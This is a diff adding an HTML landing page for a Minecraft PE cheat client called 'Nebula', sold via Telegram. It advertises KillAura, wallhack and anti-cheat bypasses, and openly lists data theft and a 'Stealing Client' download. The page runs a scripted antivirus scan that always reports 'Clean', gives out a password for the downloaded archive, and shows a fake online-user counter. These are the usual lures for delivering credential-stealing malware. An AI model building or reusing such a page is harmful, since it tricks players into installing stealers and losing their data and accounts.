@@ -1,0 +1,1022 @@
+#webhud takes care of you. And gives you copyright-free style
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebHud | SHARING A STYLE</title>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        /* ================= VARIABLES ================= */
+        :root {
+            --primary: #6366f1;       /* Indigo */
+            --primary-light: #818cf8; /* Lighter Indigo */
+            --accent: #c084fc;        /* Purple Accent */
+            --bg-deep: #020205;       /* Deepest Black */
+            
+            --glass-bg: rgba(255, 255, 255, 0.03);
+            --glass-border: rgba(255, 255, 255, 0.06);
+            --glass-highlight: rgba(255, 255, 255, 0.15);
+            
+            --text-main: #ffffff;
+            --text-muted: #94a3b8;
+            --line-color: rgba(255, 255, 255, 0.08);
+            
+            --color-success: #00ffc8; /* Teal/Cyan Check */
+            --color-fail: #ff5555;    /* Red Fail */
+            --color-star: #f59e0b;    /* Gold Star */
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-deep);
+            color: var(--text-main);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            scroll-behavior: smooth;
+        }
+
+        /* ================= BACKGROUND (Fixed) ================= */
+        .global-bg {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: -1;
+            background: 
+                radial-gradient(circle at 10% 20%, rgba(99, 102, 241, 0.08), transparent 40%),
+                radial-gradient(circle at 90% 60%, rgba(168, 85, 247, 0.08), transparent 40%),
+                linear-gradient(180deg, #020205 0%, #080810 100%);
+        }
+
+        /* Noise texture overlay for premium feel */
+        .global-bg::after {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIj48ZmlsdGVyIGlkPSJnoiPjxmZVR1cmJ1bGVuY2UgdHlwZT0iZnJhY3RhbE5vaXNlIiBiYXNlRnJlcXVlbmN5PSIwLjY1IiBudW1PY3RhdmVzPSIzIiBzdGl0Y2hUaWxlcz0ic3RpdGNoIi8+PC9maWx0ZXI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsdGVyPSJ1cmwoI2cpIiBvcGFjaXR5PSIwLjAzIi8+PC9zdmc+');
+            opacity: 0.4;
+            pointer-events: none;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ================= ANIMATIONS ================= */
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        @keyframes shine {
+            0% { left: -100%; }
+            20% { left: 100%; }
+            100% { left: 100%; }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .anim-float { animation: float 6s ease-in-out infinite; }
+        .anim-fade { animation: fadeIn 0.8s ease-out forwards; opacity: 0; }
+        .d-1 { animation-delay: 0.1s; }
+        .d-2 { animation-delay: 0.2s; }
+        .d-3 { animation-delay: 0.3s; }
+        .d-4 { animation-delay: 0.4s; }
+        .d-5 { animation-delay: 0.5s; }
+        .d-6 { animation-delay: 0.6s; }
+        .d-7 { animation-delay: 0.7s; }
+
+        /* ================= HERO SECTION ================= */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 60px 0;
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50px;
+            color: var(--primary-light);
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 25px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+        }
+        
+        .badge::before {
+            content: '';
+            width: 6px; height: 6px;
+            background: #10b981;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #10b981;
+        }
+
+        h1.title {
+            font-size: clamp(3.5rem, 8vw, 6rem);
+            font-weight: 900;
+            line-height: 1.05;
+            margin-bottom: 25px;
+            background: linear-gradient(180deg, #ffffff 0%, #a5b4fc 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(0 0 40px rgba(99, 102, 241, 0.4));
+            letter-spacing: -2px;
+        }
+
+        p.subtitle {
+            font-size: 1.25rem;
+            color: var(--text-muted);
+            max-width: 650px;
+            margin: 0 auto 60px auto;
+            line-height: 1.6;
+            font-weight: 300;
+        }
+
+        /* Stats Cards */
+        .stats-wrapper {
+            display: flex;
+            gap: 30px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .stat-card {
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            padding: 25px 50px;
+            border-radius: 24px;
+            backdrop-filter: blur(12px);
+            min-width: 220px;
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card:hover {
+            transform: translateY(-5px);
+            border-color: rgba(99, 102, 241, 0.5);
+            box-shadow: 0 15px 40px rgba(99, 102, 241, 0.15);
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent);
+            opacity: 0.3;
+        }
+
+        .stat-val {
+            display: block;
+            font-size: 3rem;
+            font-weight: 800;
+            /* Gradient Text for Numbers */
+            background: linear-gradient(135deg, #fff, var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+        }
+
+        .stat-lbl {
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            font-weight: 700;
+        }
+
+        /* ================= VIDEO PREVIEW ================= */
+        .video-section { margin: 100px 0; }
+        
+        .video-frame {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--glass-border);
+            border-radius: 30px;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            height: 0;
+            border-radius: 20px;
+            overflow: hidden;
+            background: #000;
+        }
+
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* ================= FEATURES GRID ================= */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 25px;
+            margin: 120px 0;
+        }
+
+        .feature-box {
+            background: linear-gradient(160deg, rgba(255,255,255,0.03) 0%, rgba(255,255,255,0.01) 100%);
+            border: 1px solid var(--glass-border);
+            padding: 40px 35px;
+            border-radius: 28px;
+            transition: all 0.4s ease;
+            position: relative;
+        }
+
+        .feature-box:hover {
+            transform: translateY(-8px);
+            background: rgba(255,255,255,0.05);
+            border-color: var(--primary-light);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.4);
+        }
+
+        /* --- ICON MAGIC --- */
+        .f-icon {
+            font-size: 3.5rem;
+            margin-bottom: 25px;
+            /* Default state: Neon Purple Monochrome */
+            filter: grayscale(100%) brightness(120%) sepia(100%) hue-rotate(210deg) saturate(400%);
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); /* Bouncy transition */
+            display: inline-block;
+        }
+
+        /* Hover state: Full Color + Pop + Glow */
+        .feature-box:hover .f-icon {
+            filter: grayscale(0%) sepia(0%) hue-rotate(0deg) saturate(100%) drop-shadow(0 0 20px rgba(255,255,255,0.4));
+            transform: scale(1.1) rotate(5deg);
+        }
+
+        .f-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+
+        .f-description {
+            color: var(--text-muted);
+            line-height: 1.7;
+            font-size: 0.95rem;
+        }
+
+        /* ================= MINIMALIST COMPARISON TABLE ================= */
+        .comparison-section {
+            max-width: 950px;
+            margin: 120px auto;
+            text-align: center;
+        }
+
+        .comparison-section h2 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 50px;
+            background: linear-gradient(90deg, #fff, var(--primary-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .table-header, .table-row, .table-group-header, .table-footer {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr; /* Feature | Free | Premium */
+            align-items: center;
+            border-bottom: 1px solid var(--line-color);
+            padding: 15px 0;
+            gap: 15px;
+        }
+        
+        .table-body {
+            border: 1px solid var(--line-color);
+            border-top: none;
+            border-radius: 0 0 12px 12px;
+            overflow: hidden;
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .table-header {
+            font-weight: 700;
+            font-size: 1rem;
+            text-transform: uppercase;
+            color: var(--primary-light);
+            background: rgba(255, 255, 255, 0.05);
+            padding: 20px 0;
+            border-radius: 12px 12px 0 0;
+            border: 1px solid var(--line-color);
+            border-bottom: none;
+        }
+
+        .table-row {
+            font-size: 0.95rem;
+            color: var(--text-muted);
+            transition: background 0.2s ease;
+        }
+        .table-row:hover {
+            background: rgba(255, 255, 255, 0.03);
+            color: #fff;
+        }
+        
+        .table-group-header {
+            font-weight: 700;
+            color: #fff;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 10px 0;
+            border-top: 1px solid var(--line-color);
+        }
+
+        /* NEW: Table Footer for Price & Actions */
+        .table-footer {
+            border-bottom: none;
+            padding: 20px 0;
+        }
+        
+        .table-footer.price-row {
+            font-weight: 700;
+            font-size: 1.2rem;
+            border-top: 1px solid var(--line-color);
+        }
+        .table-footer.action-row {
+             padding-bottom: 30px;
+        }
+
+
+        .premium-column {
+            background: rgba(99, 102, 241, 0.1);
+            position: relative;
+            box-shadow: inset 2px 0 0 var(--primary), inset -2px 0 0 var(--primary), 0 0 15px rgba(99, 102, 241, 0.2);
+            /* Important for alignment: matching row padding */
+            padding: 15px 0; 
+            margin: -15px 0; 
+        }
+        /* Adjust premium column for footer rows */
+        .table-footer .premium-column {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .table-footer.price-row .premium-column {
+            padding: 20px 0; 
+            margin: -20px 0;
+        }
+
+        /* Column Specific Styling (Padding, Alignment) */
+        .feature-cell {
+            text-align: left;
+            padding-left: 20px;
+            color: #fff;
+        }
+        
+        .status-cell {
+            text-align: center;
+        }
+
+        /* NEW: Professional Icons */
+        .status-cell span {
+            font-family: sans-serif; /* Ensures clean rendering */
+            font-size: 1.2rem;
+            display: inline-block;
+            line-height: 1;
+        }
+
+        .icon-check { 
+            color: var(--color-success); 
+            font-weight: 900; 
+            text-shadow: 0 0 8px rgba(0, 255, 200, 0.5);
+        }
+        .icon-star { 
+            color: var(--color-star); 
+            font-weight: 900; 
+            text-shadow: 0 0 8px rgba(245, 158, 11, 0.5);
+        }
+        .icon-dash { 
+            color: var(--color-fail); 
+            font-weight: 700; 
+            transform: scale(1.2); 
+            opacity: 0.8;
+        }
+
+        /* Small Button Style (for table) */
+        .btn-small {
+            display: inline-block;
+            padding: 12px 25px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            text-align: center;
+            border: 1px solid transparent;
+        }
+        .btn-small.free {
+            background: transparent;
+            color: var(--primary-light);
+            border-color: var(--primary-light);
+        }
+        .btn-small.free:hover {
+            background: var(--primary-light);
+            color: var(--bg-deep);
+        }
+        .btn-small.btn-premium-buy {
+            background: var(--primary);
+            color: #fff;
+            box-shadow: 0 0 15px rgba(99, 102, 241, 0.5);
+            border-color: var(--primary);
+        }
+        .btn-small.btn-premium-buy:hover {
+            background: var(--primary-light);
+            box-shadow: 0 0 25px rgba(99, 102, 241, 0.8);
+            transform: scale(1.05);
+        }
+
+        /* ================= DOWNLOAD CTA ================= */
+        .cta-section {
+            text-align: center;
+            padding: 100px 40px;
+            background: linear-gradient(180deg, rgba(99,102,241,0.06) 0%, rgba(0,0,0,0) 100%);
+            border-radius: 50px;
+            border-top: 1px solid var(--line-color);
+            margin-bottom: 60px; /* Reduced margin to make space for widget */
+        }
+
+        .cta-title {
+            font-size: 3rem;
+            font-weight: 800;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #fff, #94a3b8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        /* BUTTON WITH SHINE EFFECT */
+        .btn-main {
+            position: relative;
+            background: var(--primary);
+            color: #fff;
+            border: none;
+            padding: 24px 60px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            border-radius: 16px;
+            cursor: pointer;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(99, 102, 241, 0.3);
+            margin-top: 40px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-main:hover {
+            transform: scale(1.02) translateY(-3px);
+            box-shadow: 0 20px 60px rgba(99, 102, 241, 0.6);
+            background: var(--primary-light);
+        }
+
+        /* The Shine Animation */
+        .btn-main::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -150%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transform: skewX(-20deg);
+            animation: shine 4s infinite;
+        }
+
+        /* ================= TELEGRAM WIDGET ================= */
+        .telegram-widget {
+            max-width: 700px;
+            margin: 60px auto 100px auto;
+            background: linear-gradient(140deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.01) 100%);
+            border: 1px solid var(--line-color);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 15px 50px rgba(0,0,0,0.5);
+            transition: all 0.3s ease;
+        }
+        .telegram-widget:hover {
+            transform: translateY(-5px);
+            border-color: var(--accent);
+            box-shadow: 0 15px 50px rgba(192, 132, 252, 0.3);
+        }
+
+        .tg-icon {
+            font-size: 3rem;
+            color: #0088cc; /* Telegram blue */
+            text-shadow: 0 0 15px rgba(0, 136, 204, 0.8);
+            margin-bottom: 15px;
+        }
+
+        .tg-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .tg-desc {
+            color: var(--text-muted);
+            margin-bottom: 25px;
+        }
+
+        .btn-tg {
+            display: inline-block;
+            background: #0088cc;
+            color: #fff;
+            padding: 15px 35px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: background 0.3s ease;
+        }
+        .btn-tg:hover {
+            background: #00aaff;
+            box-shadow: 0 0 20px rgba(0, 136, 204, 0.6);
+        }
+
+        /* ================= MODAL ================= */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(15px);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal-window {
+            background: #0a0a12;
+            border: 1px solid var(--glass-border);
+            padding: 50px;
+            border-radius: 30px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 0 100px rgba(0,0,0,0.8);
+        }
+
+        .progress-container {
+            background: rgba(255,255,255,0.05);
+            height: 8px;
+            border-radius: 10px;
+            margin: 30px 0;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .progress-bar {
+            background: #10b981;
+            height: 100%;
+            width: 0%;
+            transition: width 0.1s ease-out;
+            box-shadow: 0 0 15px #10b981;
+        }
+
+        .status-item {
+            display: flex; justify-content: space-between;
+            padding: 14px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            font-size: 0.95rem;
+            color: #aaa;
+        }
+        
+        .status-val.safe { color: #10b981; font-weight: 700; text-shadow: 0 0 10px rgba(16, 185, 129, 0.3); }
+
+        .password-info {
+            background: rgba(99, 102, 241, 0.1);
+            border: 1px solid var(--primary);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .password-label {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-bottom: 8px;
+        }
+
+        .password-value {
+            color: var(--color-success);
+            font-size: 1.3rem;
+            font-weight: 700;
+            font-family: monospace;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(0, 255, 200, 0.5);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 50px 0;
+            border-top: 1px solid var(--line-color);
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        /* Mobile */
+        @media(max-width: 768px) {
+            .title { font-size: 3rem; }
+            .stats-wrapper { gap: 15px; }
+            .stat-card { min-width: 100%; padding: 20px; }
+            .video-container { padding-bottom: 56.25%; } /* Сохраняем пропорции на мобильных */
+            
+            /* Table optimization for small screens */
+            .table-header, .table-row, .table-group-header, .table-footer {
+                grid-template-columns: 2fr 1fr 1fr; 
+                padding: 12px 0;
+            }
+            .feature-cell { padding-left: 10px; font-size: 0.9rem; }
+            .premium-column { margin: -12px 0; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="global-bg"></div>
+
+    <div class="container">
+        
+        <section class="hero">
+            <div class="badge anim-fade anim-float">
+                v1.3 • MCPE 1.1.5 - 1.21+
+            </div>
+            <h1 class="title anim-fade d-1">SOURCE NEBULA SITE</h1>
+            <p class="subtitle anim-fade d-2">
+                Telegram channel - @webhud
+            </p>
+            
+            <div class="stats-wrapper anim-fade d-3">
+                <div class="stat-card">
+                    <span class="stat-val">0+</span>
+                    <span class="stat-lbl">Downloads</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-val">0</span>
+                    <span class="stat-lbl">Online Now</span>
+                </div>
+            </div>
+        </section>
+
+        <section class="video-section">
+            <div class="video-frame">
+                <div class="video-container">
+                    <iframe 
+                        src="https://www.youtube.com/embed/Cxmvq1MCR3c?si=c-s6-Zu5deUQMM1N" 
+                        title="RECROLL MOMENT"
+                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
+                    </iframe>
+                </div>
+            </div>
+        </section>
+
+        <section class="features-grid">
+<div class="feature-box">
+<span class="f-icon">🛡️</span>
+<h3 class="f-title">Private Exploits</h3>
+<p class="f-description">KillAura, Reach, and Hitbox modules specifically designed to bypass major server protections including BreadixPE, MineNex, and DoshikMine with maximum efficiency.</p>
+</div>
+
+<div class="feature-box">
+<span class="f-icon">🔒</span>
+<h3 class="f-title">Stay Undetected</h3>
+<p class="f-description">Complete protection against OBS capture, Discord streaming, and screen recording. Advanced bypass technology ensures your activities remain completely hidden from detection systems.</p>
+</div>
+
+<div class="feature-box">
+<span class="f-icon">⚡</span>
+<h3 class="f-title">Performance Boost</h3>
+<p class="f-description">Experience significant FPS improvement with optimized rendering and memory management. Noticeable performance gains even on low-end devices for buttery smooth gameplay.</p>
+</div>
+
+<div class="feature-box">
+<span class="f-icon">🎭</span>
+<h3 class="f-title">Fake Meta</h3>
+<p class="f-description">Appear as using the legitimate Meta anti-cheat client to other players while accessing advanced features. Perfect for maintaining your reputation while enjoying enhanced capabilities.</p>
+</div>
+
+<div class="feature-box">
+<span class="f-icon">🔧</span>
+<h3 class="f-title">Custom Renderer</h3>
+<p class="f-description">Customizable sky textures like in premium PVP clients, enhanced visual effects, and improved visibility. Transform your game's appearance without performance loss.</p>
+</div>
+
+<div class="feature-box">
+<span class="f-icon">🌐</span>
+<h3 class="f-title">Dual Playstyle</h3>
+<p class="f-description">Use Nebula as a legitimate client for competitive play or unleash its full potential for maximum advantage. Our team continuously monitors anti-cheat updates to provide the best bypasses and keep you protected.</p>
+</div>
+</section>
+
+        <section class="comparison-section anim-fade d-4">
+            <h2>Compare Versions</h2>
+            
+            <div class="comparison-table">
+                <div class="table-header">
+                    <div class="feature-cell">Module / Feature</div>
+                    <div class="status-cell">FREE</div>
+                    <div class="status-cell">PREMIUM</div>
+                </div>
+                
+                <div class="table-body">
+                    
+                    <div class="table-group-header">
+                        <div class="feature-cell">CORE UTILITIES</div>
+                        <div></div>
+                        <div class="premium-column"></div>
+                    </div>
+                    <div class="table-row">
+                        <div class="feature-cell">Hitbox</div>
+                        <div class="status-cell"><span class="icon-check">✓</span></div>
+                        <div class="status-cell premium-column"><span class="icon-check">✓</span></div>
+                    </div>
+                    <div class="table-row">
+                        <div class="feature-cell">Reach (Standard)</div>
+                        <div class="status-cell"><span class="icon-check">✓</span></div>
+                        <div class="status-cell premium-column"><span class="icon-check">✓</span></div>
+                    </div>
+                    <div class="table-row">
+                        <div class="feature-cell">Velocity</div>
+                        <div class="status-cell"><span class="icon-check">✓</span></div>
+                        <div class="status-cell premium-column"><span class="icon-check">✓</span></div>
+                    </div>
+                    
+                    <div class="table-group-header">
+                        <div class="feature-cell">SECURITY & AESTHETICS</div>
+                        <div></div>
+                        <div class="premium-column"></div>
+                    </div>
+                    <div class="table-row">
+                        <div class="feature-cell">Device Spoofer</div>
+                        <div class="status-cell"><span class="icon-check">✓</span></div>
+                        <div class="status-cell premium-column"><span class="icon-check">✓</span></div>
+                    </div>
+                    <div class="table-row">
+                        <div class="feature-cell">Custom Sky</div>
+                        <div class="status-cell"><span class="icon-check">✓</span></div>
+                        <div class="status-cell premium-column"><span class="icon-check">✓</span></div>
+                    </div>
+
+                    <div class="table-group-header">
+                        <div class="feature-cell">ADVANCED MODULES</div>
+                        <div></div>
+                        <div class="premium-column"></div>
+                    </div>
+                    <div class="table-row">
+                        <div class="feature-cell">Killaura</div>
+                        <div class="status-cell"><span class="icon-dash">✕</span></div>
+                        <div class="status-cell premium-column"><span class="icon-check">✓</span></div>
+                    </div>
+                    <div class="table-row">
+                        <div class="feature-cell">ESP (Wallhack)</div>
+                        <div class="status-cell"><span class="icon-dash">✕</span></div>
+                        <div class="status-cell premium-column"><span class="icon-check">✓</span></div>
+                    </div>
+                    <div class="table-row">
+                        <div class="feature-cell">Speedhack / Fly</div>
+                        <div class="status-cell"><span class="icon-dash">✕</span></div>
+                        <div class="status-cell premium-column"><span class="icon-check">✓</span></div>
+                    </div>
+                    <div class="table-row">
+                        <div class="feature-cell">Blockselect</div>
+                        <div class="status-cell"><span class="icon-dash">✕</span></div>
+                        <div class="status-cell premium-column"><span class="icon-check">✓</span></div>
+                    </div>
+                    
+                    <div class="table-group-header">
+                        <div class="feature-cell">EXCLUSIVE EXPLOITS</div>
+                        <div></div>
+                        <div class="premium-column"></div>
+                    </div>
+                    <div class="table-row" style="border-bottom: none;">
+                        <div class="feature-cell">
+                            Private Reach & Hitbox Exploits 
+                            <span style="display: block; font-size: 0.8em; color: var(--primary-light); margin-top: 3px;">
+                                (Bypass BredixPE, MineNex, etc.)
+                            </span>
+                        </div>
+                        <div class="status-cell"><span class="icon-dash">✕</span></div>
+                        <div class="status-cell premium-column">
+                            <span class="icon-star">★</span>
+                            <span style="display: block; font-size: 0.8em; color: #fff;">Exclusive</span>
+                        </div>
+                    </div>
+                    
+                    <div class="table-group-header">
+                        <div class="feature-cell">GUARANTEED PRIVLEGES</div>
+                        <div></div>
+                        <div class="premium-column"></div>
+                    </div>
+                    <div class="table-row" style="border-bottom: none;">
+                        <div class="feature-cell">
+                            Theft of personal data from a computer
+                            <span style="display: block; font-size: 0.8em; color: var(--primary-light); margin-top: 3px;">
+                                (Bypass antivirus = Windows 10 xD)
+                            </span>
+                        </div>
+                        <div class="status-cell"><span class="icon-check">✓</span></div>
+                        <div class="status-cell premium-column">
+                            <span class="icon-check">✓</span>
+                            <span style="display: block; font-size: 0.8em; color: #ffffff;">We can steal data twice as fast</span>
+                        </div>
+                    </div>
+
+                </div>
+                
+                <div class="table-footer price-row">
+                    <div class="feature-cell"></div>
+                    <div class="status-cell">$0</div>
+                    <div class="status-cell premium-column">$5 <small>(LIFETIME)</small></div>
+                </div>
+
+                <div class="table-footer action-row">
+                    <div class="feature-cell"></div>
+                    <div class="status-cell">
+                        <button class="btn-small free" onclick="openScan()">Get Free</button>
+                    </div>
+                    <div class="status-cell premium-column">
+                        <a href="https://t.me/webhud" target="_blank" class="btn-small btn-premium-buy">Buy Now</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <div class="cta-section anim-fade d-5">
+            <h2 class="cta-title">Are you ready to share your data with us?</h2>
+            <p style="color: #ccc; font-size: 1.15rem; max-width: 600px; margin: 0 auto;">
+                Join thousands of players using our advanced MCPE utility client
+            </p>
+            
+            <button class="btn-main" onclick="openScan()">
+                🚀 Download Stealing Client for PC
+            </button>
+            
+            <p style="margin-top: 30px; color: #666; font-size: 0.85rem;">
+                Version 1.0 | Compatible: Windows 10
+            </p>
+        </div>
+
+        <section class="telegram-widget anim-fade d-6">
+            <div class="tg-icon">💬</div>
+            <h3 class="tg-title">Our Official Telegram Channel</h3>
+            <p class="tg-desc">
+                Join us.
+            </p>
+            <a href="https://t.me/webhud" target="_blank" class="btn-tg">
+                Join Telegram
+            </a>
+        </section>
+
+        <footer class="footer">
+            <p>Nebula Client © 2026. All rights reserved.</p>
+            <p>For educational and personal use only. Use responsibly.</p>
+            <p>There are no copyrights on this source code! It's all open-source, so feel free to use it.</p>
+            <p>Webhud takes care of you. Happy New Year!🎄</p>
+        </footer>
+
+    </div>
+
+    <div id="scanModal" class="modal-overlay">
+        <div class="modal-window">
+            <h3 style="font-size: 1.8rem; margin-bottom: 20px; color: #fff;">🔒 Security Verification</h3>
+            
+            <div class="progress-container">
+                <div class="progress-bar" id="pBar"></div>
+            </div>
+            
+            <div class="status-item">
+                <span>Windows Defender</span> <span id="st1" class="status-val">Scanning...</span>
+            </div>
+            <div class="status-item">
+                <span>Avast Antivirus</span> <span id="st2" class="status-val">Scanning...</span>
+            </div>
+            <div class="status-item">
+                <span>Cloud Analysis</span> <span id="st3" class="status-val">Scanning...</span>
+            </div>
+
+            <div id="passwordSection" style="display:none;">
+                <div class="password-info">
+                    <div class="password-label">Archive Password:</div>
+                    <div class="password-value" id="archivePassword">webhud</div>
+                    <div style="color: var(--text-muted); font-size: 0.8rem; margin-top: 8px;">
+                        Use this password to extract the downloaded archive
+                    </div>
+                </div>
+            </div>
+
+            <form method="POST" id="realDlBtn" style="display:none; margin-top: 30px;">
+                <input type="hidden" name="download" value="1">
+                <button class="btn-main" style="width: 100%; margin: 0; padding: 20px; animation: none;">
+                    ✅ Download File (StealingPC.zip)
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // 1. Config Constants (from PHP)
+        const minUsers = 30;
+        const maxUsers = 40;
+        const archivePassword = 'nebula';
+        
+        // 2. Online Logic
+        const onlineEl = document.getElementById('onlineNum');
+        let curr = 31;
+        
+        setInterval(() => {
+            let move = Math.floor(Math.random() * 3) - 1; 
+            let next = curr + move;
+            
+            if(next < minUsers) next = minUsers;
+            if(next > maxUsers) next = maxUsers;
+            
+            curr = next;
+            onlineEl.innerText = curr;
+        }, 5000);
+
+        // 3. Modal Logic
+        const modal = document.getElementById('scanModal');
+        const bar = document.getElementById('pBar');
+        const btn = document.getElementById('realDlBtn');
+        const passwordSection = document.getElementById('passwordSection');
+        const s1 = document.getElementById('st1');
+        const s2 = document.getElementById('st2');
+        const s3 = document.getElementById('st3');
+
+        function openScan() {
+            modal.style.display = 'flex';
+            // Reset
+            bar.style.width = '0%';
+            btn.style.display = 'none';
+            passwordSection.style.display = 'none';
+            s1.innerText = 'Scanning...'; s1.className = 'status-val';
+            s2.innerText = 'Scanning...'; s2.className = 'status-val';
+            s3.innerText = 'Scanning...'; s3.className = 'status-val';
+
+            let width = 0;
+            let timer = setInterval(() => {
+                width += 1.5;
+                bar.style.width = width + '%';
+
+                if (width > 25) { s1.innerText = 'Clean'; s1.className = 'status-val safe'; }
+                if (width > 60) { s2.innerText = 'Clean'; s2.className = 'status-val safe'; }
+                if (width > 85) { 
+                    s3.innerText = 'Clean'; s3.className = 'status-val safe'; 
+
+                    passwordSection.style.display = 'block';
+                }
+
+                if (width >= 100) {
+                    clearInterval(timer);
+                    btn.style.display = 'block';
+                }
+            }, 40);
+        }
+
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) modal.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
